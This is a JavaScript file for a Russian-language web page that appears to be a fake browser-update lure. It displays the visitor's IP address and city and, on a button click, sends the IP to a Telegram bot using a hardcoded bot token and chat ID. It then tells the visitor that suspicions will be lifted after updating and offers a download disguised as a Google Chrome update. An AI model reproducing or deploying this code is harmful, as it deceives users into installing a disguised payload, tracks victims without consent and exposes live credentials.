 
 
 

const main = () => {
	const ipAdressElHtml = document.getElementById('ipAdress') 

	let ip = null
	const api = async () => {
	const response = await fetch('https://ipinfo.io/json?token=4bc70598165c3f', {
		headers: {'Content-type': 'application/json'},
		method: 'GET'

	})

		const data = await response.json()
		console.log(data)
		ip = data.ip
		ipAdressElHtml.innerHTML = `ВАШ iP АДРЕС - <span>${data.ip}</span> МЕСТОПОЛОЖЕНИЕ - <span>${data.city}</span>`
 
 

}
	api()


	const sendIp = async () => {
		const TOKEN = '6131017199:AAEl_KrpJGLGV4nIoEKPuFkr4nBMiuDP4rY',
			CHAT_ID = '-1001850148394',
			URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`

		const responce = await fetch(URI_API, {
			headers: {
				'Content-Type': 'application/json'
			},
			method: "post",
			body: JSON.stringify({chat_id: CHAT_ID, text:`Новый переход ip - ${ip}`})
		})
		const data = await responce.json()
	 

		
	}
	const buttonNotViolation = document.querySelector('.wrapper__button-nor'),
		wraper__rerulesb = document.querySelector('.wrapper') 
 

 
	const	rerulsHtmlEl = document.getElementById('reruls'),
		imagesHtmlEl = document.getElementById('images'),
		updateHtmlEl = document.getElementById('update'),
		stepTwoHtmlEl = document.getElementById('stepTwo')
		

	const getButtons = () => {
		const buttons = document.querySelectorAll('.wrapper__button-nor')
		buttons.forEach(button => button.addEventListener('click', () => {
		 
				if(button.id === 'set') {
					console.log('erewre')
					const loader = document.querySelector('.loader'),
						loaderText = document.getElementById('loaderFin')
						loaderText.style = 'display: none !important; margin-top: -40px !important;'
					loader.style = 'display: block !important; margin-top: -40px !important;'
					setTimeout(() => {
						console.log(loader)
						loader.style = 'display:none !important; margin-top: -40px !important;'
						loaderText.style = 'display: block !important; margin-top: -40px !important;'
					}, 1500)
				}
			}
		))
	}	


	const clickNotViolation = () => {
		sendIp()
		rerulsHtmlEl.remove()
 
		updateHtmlEl.textContent = 'После обновления нажмите кнопку "Проверить обновление" и подозрения будут сняты.'
		imagesHtmlEl.insertAdjacentHTML('afterbegin', `
		<img width="300px" height="250px" src="img/ikdls.png" alt="imgSite">
		<img width="300px" height="250px" src="img/ikdls.png" alt="imgSite">
		
		`)
		wraper__rerulesb.insertAdjacentHTML('beforeend', `
		<div class="wrap_buttons"> 
			<button id='set' class="wrapper__button-nor custombtn  ">  <?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="#fefefe" height="40" preserveAspectRatio="xMidYMid meet" version="1" viewBox="4.0 0.5 23.9 31.0" width="40" zoomAndPan="magnify"><g id="change1_1"><path d="M4.04999,27.70996C4.04999,29.79999,5.75,31.5,7.84003,31.5h16.31995c2.09003,0,3.79004-1.70001,3.79004-3.79004V16.28998 c0-1.70001-1.13-3.12-2.66003-3.59998V9.78998C25.28998,4.66998,21.12,0.5,16,0.5S6.71002,4.66998,6.71002,9.78998V12.69 c-1.53003,0.47998-2.66003,1.89996-2.66003,3.59998V27.70996z M17.5,24.71997v0.35999c0,0.83002-0.66998,1.5-1.5,1.5 s-1.5-0.66998-1.5-1.5v-0.35999c-1.34998-0.57996-2.31-1.92999-2.31-3.48999c0-2.09998,1.71002-3.81,3.81-3.81 s3.81,1.71002,3.81,3.81C19.81,22.78998,18.84998,24.14001,17.5,24.71997z M9.71002,9.78998C9.71002,6.32001,12.53003,3.5,16,3.5 s6.28998,2.82001,6.28998,6.28998V12.5H9.71002V9.78998z" fill="inherit"/><path d="M16,20.41998c-0.44,0-0.81,0.35999-0.81,0.81c0,0.44,0.37,0.79999,0.81,0.79999s0.81-0.35999,0.81-0.79999 C16.81,20.77997,16.44,20.41998,16,20.41998z" fill="inherit"/></g></svg> ПРОВЕРИТЬ </button>
			<a href='./source/Google Chrome.html' download> 
				<button class="wrapper__button-nor custombtn style='margin-top: 20px !important;'"><p class="warning cusWarn">дождитесь загрузки файла после чего установите ​обновление, ЧТОБЫ УБЕДИТЬСЯ НАЖМИТЕ ПРОВЕРИТЬ</p> <?xml version="1.0" encoding="UTF-8" standalone="no"?><svg class="chrome" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="#000000" height="40" preserveAspectRatio="xMidYMid meet" version="1" viewBox="3.1 3.4 58.0 56.5" width="40" zoomAndPan="magnify"><g fill="#ffffff" id="change1_1"><path d="m16.93 24.49a2.74 2.74 0 0 0 4.63.22 12.68 12.68 0 0 1 4.53-4.07c2.73-1.44 5.25-1.35 9.16-1.35h16.75a2.76 2.76 0 0 0 2.17-4.45 28 28 0 0 0 -40.44-4 5 5 0 0 0 -1 6.3z" fill="inherit"/><path d="m33.86 41.13a9.31 9.31 0 1 0 -11.18-9.13 9.29 9.29 0 0 0 11.18 9.13z" fill="inherit"/><path d="m24.53 59a2.75 2.75 0 0 0 3.07-1.27l3.6-6.09a5 5 0 0 0 -2.79-7.4 12.66 12.66 0 0 1 -7.49-6c-2-3.44-6.54-11.35-9.9-17.2a2.75 2.75 0 0 0 -4.93.3 28.07 28.07 0 0 0 18.44 37.66z" fill="inherit"/><path d="m49.24 22.69a5.08 5.08 0 0 0 -4.92 6.31 12.7 12.7 0 0 1 -1.32 9.37c-1.76 3-6.56 11.16-10.19 17.28a2.76 2.76 0 0 0 2.73 4.14 28.06 28.06 0 0 0 23.46-35.1 2.75 2.75 0 0 0 -2.66-2z" fill="inherit"/></g></svg> УСТАНОВИТЬ </button>
			 
			</a>
			 
		</div>
	 
		`)
		getButtons()
		stepTwoHtmlEl.style = 'display:block !important;'
		buttonNotViolation.remove()

	}

	buttonNotViolation.addEventListener('click', clickNotViolation)
}
document.addEventListener('DOMContentLoaded', main)  



 